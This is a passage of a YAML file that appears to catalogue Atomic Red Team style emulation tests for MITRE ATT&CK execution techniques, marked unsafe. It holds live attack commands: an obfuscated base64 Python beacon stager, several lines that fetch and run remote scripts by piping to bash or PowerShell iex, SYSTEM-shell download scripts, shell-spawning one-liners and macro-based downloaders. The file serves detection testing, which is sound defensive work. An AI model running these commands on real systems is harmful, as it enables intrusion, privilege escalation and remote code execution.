      command: osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\" | python &\""
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1059/002
  is_safe: false
- id: T1059.003
  name: Windows Command Shell
  description: Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/technique...
  tactic: execution
  platforms:
    - windows
  executors:
    - name: Create and Execute Batch Script
      type: powershell
      platform: windows
      command: Start-Process "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat"
      cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat" -Force -ErrorAction Ignore
      timeout: 120
    - name: Writes text to a file and displays it.
      type: cmd
      platform: windows
      command: echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
      cleanup: del "%TEMP%\test.bin" >nul 2>&1
      timeout: 120
    - name: Suspicious Execution via Windows Command Shell
      type: cmd
      platform: windows
      command: '%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt'
      timeout: 120
    - name: Simulate BlackByte Ransomware Print Bombing
      type: powershell
      platform: windows
      command: cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p PathToAtomicsFolder\..\ExternalPayloads\T1059_003note.txt" | out-null
      cleanup: stop-process -name wordpad -force -erroraction silentlycontinue
      timeout: 120
    - name: Command Prompt read contents from CMD file and execute
      type: cmd
      platform: windows
      command: cmd /r cmd<"PathToAtomicsFolder\T1059.003\src\t1059.003_cmd.cmd"
      timeout: 120
    - name: Command prompt writing script to file then executes it
      type: cmd
      platform: windows
      command: c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject("WScript.Shell"):Set objExec = objShell.Exec("whoami"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
      cleanup: del "AtomicTest.vbs" >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1059/003
  is_safe: false
- id: T1059.004
  name: Unix Shell
  description: |-
    Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

    Unix shells also support scripts that enable sequential execution of commands...
  tactic: execution
  platforms:
    - linux
    - macos
  executors:
    - name: Create and Execute Bash Shell Script
      type: sh
      platform: linux
      command: |-
        sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
        sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
        chmod +x /tmp/art.sh
        sh /tmp/art.sh
      cleanup: rm /tmp/art.sh
      timeout: 60
    - name: Create and Execute Bash Shell Script
      type: sh
      platform: macos
      command: |-
        sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
        sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
        chmod +x /tmp/art.sh
        sh /tmp/art.sh
      cleanup: rm /tmp/art.sh
      timeout: 60
    - name: Command-Line Interface
      type: sh
      platform: linux
      command: |-
        curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
        wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
      cleanup: rm /tmp/art-fish.txt
      timeout: 60
    - name: Command-Line Interface
      type: sh
      platform: macos
      command: |-
        curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
        wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
      cleanup: rm /tmp/art-fish.txt
      timeout: 60
    - name: Harvest SUID executable files
      type: sh
      platform: linux
      command: |-
        chmod +x PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
        bash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
      cleanup: rm -rf PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
      timeout: 60
    - name: LinEnum tool execution
      type: sh
      platform: linux
      command: |-
        chmod +x PathToAtomicsFolder/T1059.004/src/LinEnum.sh
        bash PathToAtomicsFolder/T1059.004/src/LinEnum.sh
      cleanup: rm -rf PathToAtomicsFolder/T1059.004/src/LinEnum.sh
      timeout: 60
    - name: New script file in the tmp directory
      type: sh
      platform: linux
      command: |-
        TMPFILE=$(mktemp)
        echo "id" > $TMPFILE
        bash $TMPFILE
      cleanup: |-
        rm $TMPFILE
        unset TMPFILE
      timeout: 60
    - name: What shell is running
      type: sh
      platform: linux
      command: |-
        echo $0
        if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi
        if $(printenv SHELL >/dev/null); then printenv SHELL; fi
      timeout: 60
    - name: What shells are available
      type: sh
      platform: linux
      command: cat /etc/shells
      timeout: 60
    - name: Command line scripts
      type: sh
      platform: linux
      command: for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done
      timeout: 60
    - name: Obfuscated command line scripts
      type: sh
      platform: linux
      command: |-
        [ "$(uname)" = 'FreeBSD' ] && encodecmd="b64encode -r -" && decodecmd="b64decode -r" || encodecmd="base64 -w 0" && decodecmd="base64 -d"
        ART=$(echo -n "id" | $encodecmd)
        echo "\$ART=$ART"
        echo -n "$ART" | $decodecmd |/bin/bash
        unset ART
      timeout: 60
    - name: Change login shell
      type: bash
      platform: linux
      command: |-
        [ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
        cat /etc/passwd |grep ^art
        chsh -s /bin/sh art
        cat /etc/passwd |grep ^art
      cleanup: '[ "$(uname)" = ''FreeBSD'' ] && rmuser -y art || userdel art'
      timeout: 60
      elevation_required: true
    - name: Environment variable scripts
      type: sh
      platform: linux
      command: |-
        export ART='echo "Atomic Red Team was here... T1059.004"'
        echo $ART |/bin/sh
      cleanup: unset ART
      timeout: 60
    - name: Detecting pipe-to-shell
      type: sh
      platform: linux
      command: |-
        cd /tmp
        curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash
        ls -la /tmp/art.txt
      cleanup: rm /tmp/art.txt
      timeout: 60
    - name: Current kernel information enumeration
      type: sh
      platform: linux
      command: uname -srm
      timeout: 60
    - name: Shell Creation using awk command
      type: sh
      platform: linux
      command: awk 'BEGIN {system("/bin/sh &")}'
      timeout: 60
    - name: Shell Creation using awk command
      type: sh
      platform: macos
      command: awk 'BEGIN {system("/bin/sh &")}'
      timeout: 60
    - name: Creating shell using cpan command
      type: sh
      platform: linux
      command: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
      timeout: 60
    - name: Creating shell using cpan command
      type: sh
      platform: macos
      command: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
      timeout: 60
    - name: Shell Creation using busybox command
      type: sh
      platform: linux
      command: busybox sh &
      timeout: 60
    - name: emacs spawning an interactive system shell
      type: sh
      platform: linux
      command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
      timeout: 60
      elevation_required: true
    - name: emacs spawning an interactive system shell
      type: sh
      platform: macos
      command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1059/004
  is_safe: false
- id: T1059.005
  name: Visual Basic
  description: 'Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(C...'
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Visual Basic script execution to gather local computer information
      type: powershell
      platform: windows
      command: cscript "PathToAtomicsFolder\T1059.005\src\sys_info.vbs" > $env:TEMP\T1059.005.out.txt
      cleanup: Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
      timeout: 120
    - name: Encoded VBS code execution
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
      cleanup: Get-WmiObject win32_process | Where-Object {$_.CommandLine -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
      timeout: 120
    - name: Extract Memory via VBA
      type: powershell
      platform: windows
      command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\""
      cleanup: Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin" -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1059/005
  is_safe: false
- id: T1059.006
  name: Python
  description: |-
    Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)

    Python comes with many built-in packages to...
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Execute shell script via python's command mode arguement
      type: sh
      platform: linux
      command: |-
        which_python=$(which python || which python3 || which python3.9 || which python2)
        $which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
      cleanup: "rm T1059.006-payload \npip-autoremove pypykatz >nul 2> nul"
      timeout: 60
    - name: Execute Python via scripts
      type: sh
      platform: linux
      command: |-
        which_python=$(which python || which python3 || which python3.9 || which python2)
        echo 'import requests' > T1059.006.py
        echo 'import os' >> T1059.006.py
        echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
        echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
        echo 'session = requests.session()' >> T1059.006.py
        echo 'source = session.get(url).content' >> T1059.006.py
        echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
        echo 'fd.write(source)' >> T1059.006.py
        echo 'fd.close()' >> T1059.006.py
        echo 'os.system(malicious_command)' >> T1059.006.py
        $which_python T1059.006.py
      cleanup: rm T1059.006.py T1059.006-payload
      timeout: 60
    - name: Execute Python via Python executables
      type: sh
      platform: linux
      command: |-
        which_python=$(which python || which python3 || which python3.9 || which python2)
        echo 'import requests' > T1059.006.py
        echo 'import os' >> T1059.006.py
        echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
        echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
        echo 'session = requests.session()' >> T1059.006.py
        echo 'source = session.get(url).content' >> T1059.006.py
        echo 'fd = open("T1059.006-payload", "wb+")' >> T1059.006.py
        echo 'fd.write(source)' >> T1059.006.py
        echo 'fd.close()' >> T1059.006.py
        echo 'os.system(malicious_command)' >> T1059.006.py
        $which_python -c 'import py_compile; py_compile.compile("T1059.006.py", "T1059.006.pyc")'
        $which_python T1059.006.pyc
      cleanup: rm T1059.006.pyc T1059.006.py T1059.006-payload
      timeout: 60
    - name: Python pty module and spawn function used to spawn sh or bash
      type: sh
      platform: linux
      command: |-
        which_python=$(which python || which python3 || which python3.9 || which python2)
        $which_python -c "import pty;pty.spawn('/bin/sh')"
        exit
        $which_python -c "import pty;pty.spawn('/bin/bash')"
        exit
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1059/006
  is_safe: false
- id: T1059.007
  name: JavaScript
  description: |-
    Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)

    JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Com...
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: JScript execution to gather local computer information via cscript
      type: cmd
      platform: windows
      command: cscript "PathToAtomicsFolder\T1059.007\src\sys_info.js" > %tmp%\T1059.007.out.txt
      cleanup: del %tmp%\T1059.007.out.txt >nul 2>&1
      timeout: 120
    - name: JScript execution to gather local computer information via wscript
      type: cmd
      platform: windows
      command: wscript "PathToAtomicsFolder\T1059.007\src\sys_info.js"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1059/007
  is_safe: false
- id: T1059.010
  name: AutoHotKey & AutoIT
  description: |-
    Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)

    Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's...
  tactic: execution
  platforms:
    - windows
  executors:
    - name: AutoHotKey script execution
      type: powershell
      platform: windows
      command: Start-Process -FilePath "$PathToAtomicsFolder\..\ExternalPayloads\ahk\AutoHotKeyU64.exe" -ArgumentList "PathToAtomicsFolder\T1059.010\src\calc.ahk"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1059/010
  is_safe: false
- id: T1072
  name: Software Deployment Tools
  description: 'Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment ...'
  tactic: execution
  tactics:
    - execution
    - lateral-movement
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Radmin Viewer Utility
      type: cmd
      platform: windows
      command: '"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"'
      timeout: 120
      elevation_required: true
    - name: PDQ Deploy RAT
      type: cmd
      platform: windows
      command: '"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe"'
      timeout: 120
      elevation_required: true
    - name: Deploy 7-Zip Using Chocolatey
      type: powershell
      platform: windows
      command: |-
        # Deploy 7-Zip using Chocolatey
        choco install -y 7zip
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1072
  is_safe: false
- id: T1106
  name: Native API
  description: 'Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations...'
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Execution through API - CreateProcess
      type: cmd
      platform: windows
      command: |-
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"%tmp%\T1106.exe" /target:exe "PathToAtomicsFolder\T1106\src\CreateProcess.cs"
        %tmp%/T1106.exe
      timeout: 120
    - name: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
      timeout: 120
    - name: WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
      timeout: 120
    - name: WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
      timeout: 120
    - name: Run Shellcode via Syscall in Go
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
      cleanup: Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1106
  is_safe: false
- id: T1129
  name: Shared Modules
  description: |-
    Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).

    Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that per...
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: ESXi - Install a custom VIB on an ESXi host
      type: cmd
      platform: windows
      command: |-
        PathToAtomicsFolder\..\ExternalPayloads\pscp.exe -pw pass PathToAtomicsFolder\..\atomics\T1129\src\atomicvibes.vib root@atomic.local:/tmp
        echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibinstall.txt"
      cleanup: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibremove.txt"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1129
  is_safe: false
- id: T1204.002
  name: Malicious File
  description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg, and .iso.(C...
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: OSTap Style Macro Execution
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
      cleanup: Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
      timeout: 120
    - name: OSTap Payload Download
      type: cmd
      platform: windows
      command: |-
        echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js
        cscript //E:Jscript %TEMP%\OSTapGet.js
      cleanup: del %TEMP%\OSTapGet.js /F /Q >nul 2>&1
      timeout: 120
    - name: Maldoc choice flags command execution
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
        Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
      timeout: 120
    - name: OSTAP JS version
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`", vbNormalFocus)`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
      timeout: 120
    - name: Office launching .bat file from AppData
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"$("$env:temp\art1204.bat")`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $("$env:temp\art1204.bat") `", vbNormalFocus)`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct Word
      cleanup: |-
        Remove-Item $("$env:temp\art1204.bat") -ErrorAction Ignore
        Get-Process | Where-Object { $_.MainModule.FileName -like "*calculator*" } | Stop-Process
      timeout: 120
    - name: Excel 4 Macro
      type: powershell
      platform: windows
      command: |-
        $fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"
        $fname1 = "$env:TEMP\procexp.exe"
        if (Test-Path $fname) {
          Remove-Item $fname
          Remove-Item $fname1
        }

        $xlApp = New-Object -COMObject "Excel.Application"
        $xlApp.Visible = $True
        $xlApp.DisplayAlerts = $False
        $xlBook = $xlApp.Workbooks.Add()
        $sheet = $xlBook.Excel4MacroSheets.Add()

        if ("$env:Username" -ne "") {
          $sheet.Cells.Item(1,1) = "$env:Username"
        } else {
          $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
        }

        $sheet.Cells.Item(2,1) = "procexp.exe"
        $sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"
        $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
        $sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
        $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"https://live.sysinternals.com/procexp.exe`"`"`")"
        $sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"
        $sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
        $sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
        $sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"
        $sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
        $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
        $sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"
        $sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
        $sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
        $sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
        $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"
        $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"
        $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"
        $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
        $sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"
        $sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
        $sheet.Cells.Item(23,1) = "=HALT()"
        $sheet.Cells.Item(1,1).Name = "runme"
        $xlApp.Run("runme")
        $xlApp.Quit()

        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()

        Remove-Variable xlBook
        Remove-Variable xlApp
      cleanup: |-
        Stop-Process -Name "procexp*" -ErrorAction Ignore
        Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
        Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
      timeout: 120
    - name: Headless Chrome code execution via VBA
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
      cleanup: Stop-Process -name mshta
      timeout: 120
    - name: Potentially Unwanted Applications (PUA)
      type: powershell
      platform: windows
      command: |-
        Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
        & "$env:TEMP/PotentiallyUnwanted.exe"
      cleanup: |-
        Stop-Process -name PotentiallyUnwanted
        Remove-Item $env:TEMP/PotentiallyUnwanted.exe -ErrorAction Ignore
      timeout: 120
    - name: Office Generic Payload Download
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macroCode = Get-Content "PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt" -Raw
        $URL = "" + "/" + ""
        $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt"
        Invoke-MalDoc -macroCode $macroCode -officeProduct "Word"
      cleanup: Remove-Item "C:\Users\$env:username\Desktop\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt" -ErrorAction Ignore
      timeout: 120
    - name: LNK Payload Download
      type: powershell
      platform: windows
